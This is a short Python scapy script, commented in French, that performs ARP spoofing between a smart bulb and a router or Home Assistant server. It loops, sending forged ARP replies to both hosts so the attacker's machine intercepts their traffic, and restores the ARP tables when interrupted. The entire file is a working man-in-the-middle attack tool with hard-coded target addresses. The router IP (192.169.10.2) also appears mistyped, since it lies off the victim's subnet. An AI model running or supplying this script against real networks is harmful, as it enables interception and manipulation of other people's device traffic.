from scapy.all import *
import time

# Paramètres du réseau
victim_ip = "192.168.10.24"  # IP de l'appareil cible (ampoule)
router_ip = "192.169.10.2"     # IP du routeur ou serveur Home Assistant
attacker_mac = get_if_hwaddr("wlp0s20f3")  # Adresse MAC de l'attaquant
victim_mac = "84:F3:EB:63:AF:9C" # MAC de la victime (à trouver avec `arp-scan` ou une analyse réseau)
router_mac = "30:23:03:8B:F3:1F"    # MAC du routeur ou du serveur Home Assistant
def arp_spoof(target_ip, spoof_ip, target_mac):
    # Envoi d'une fausse réponse ARP avec destination MAC explicite
    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    sendp(packet, verbose=0)

def restore_arp(target_ip, spoof_ip, target_mac, spoof_mac):
    # Restaure la table ARP à l'état normal
    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    sendp(packet, count=4, verbose=0)

try:
    print("[*] Lancement de l'ARP spoofing...")
    while True:
        # Empoisonner la victime pour qu'elle pense que nous sommes le routeur
        arp_spoof(victim_ip, router_ip, victim_mac)
        # Empoisonner le routeur pour qu'il pense que nous sommes la victime
        arp_spoof(router_ip, victim_ip, router_mac)
        time.sleep(2)  # Attendre 2 secondes avant de renvoyer les paquets

except KeyboardInterrupt:
    print("[*] ARP spoofing arrêté. Restauration des tables ARP...")
    restore_arp(victim_ip, router_ip, victim_mac, router_mac)
    restore_arp(router_ip, victim_ip, router_mac, victim_mac)
    print("[*] Tables ARP restaurées.")